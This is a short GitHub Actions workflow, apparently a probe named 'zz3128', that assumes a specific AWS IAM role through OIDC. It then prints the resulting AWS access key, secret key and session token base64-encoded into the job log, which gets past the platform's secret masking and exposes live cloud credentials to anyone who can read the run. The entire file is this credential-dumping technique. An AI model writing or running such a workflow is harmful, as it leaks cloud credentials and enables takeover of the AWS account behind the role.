name: zz3128 oidc
on: { workflow_dispatch: {} }
permissions: { id-token: write, contents: read }
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::432772479668:role/github-code-review-bedrock-role
          role-session-name: zz3128probe
          aws-region: us-east-1
      - name: whoami
        run: |
          aws sts get-caller-identity || true
          env | grep -E '^AWS_' | sort | base64 -w0; echo
          for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; do printf "%s=" $v; printenv $v | base64 -w0; echo; done
